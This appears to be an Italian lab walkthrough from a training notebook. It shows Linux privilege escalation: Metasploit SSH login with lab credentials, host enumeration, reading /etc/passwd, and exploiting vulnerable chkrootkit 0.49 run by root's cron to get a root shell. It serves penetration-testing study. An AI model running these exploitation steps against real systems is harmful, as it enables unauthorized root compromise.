# Linux Privilege Escalation: Exploiting A Vulnerable Program

<figure><img src="../../../.gitbook/assets/image (31) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Accediamo al sistema via SSH con credenziali legittime

```
service postgresql start && msfconsole
workspace -a LinuxPrivesc
setg RHOSTS 192.124.219.3
db_nmap -sV 192.124.219.3
search ssh_login
use auxiliary/scanner/ssh/ssh_login
show options
set USERNAME jackie
set PASSWORD password
exploit
sessions
sessions 1
pwd
/bin/bash -i
whoami
cat /etc/*issue
uname -r
CTRL+Z
sessions -u 1
sessions
sessions 2
sysinfo
getuid
shell
/bin/bash -i
cat /etc/passwd //per verificare quanti utenti ci sono
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege escalation

```
ps aux //per vedere se ci sono processi di root
cat /bin/check-down //il contenuto ci dice che un file chkrootkit è eseguito ogni 60 secondi
chkrootkit --help
chkrootkit -V //è 0.49, versione vulnerabile
CTRL+C
CTRL+Z
search chkrootkit
use exploit/unix/local/chkrootkit
show options
info
set CHKROOTKIT /bin/chkrootkit //perché linux riesce ad identificare il binary vero attuale
set SESSION 2
set LHOST 192.124.219.2
show options
sessions  //per controllare che non usiammo la porta presente in LPORT
exploit //crea un crontab per attendere che venga eseguito chkrootkit dal cron
/bin/bash -i
whoami //abbiamo ora root privileges
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Chkrootkit è una utility linux che cerca su linux dei rootkit, è un anti rootkit.

In questo caso è una versione vulnerabile a privilege escalation.

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

Abbiamo quindi visto come fare privilege escalation sfruttando una vulnerabilità di un programma locale del sistema.&#x20;

Questo metodo è applicabile anche a kernel exploit, che però nel caso di Metasploit Frameworks dovrebbero essere fatti manualmente e includono anche il processo di scaricare exploit code in remoto
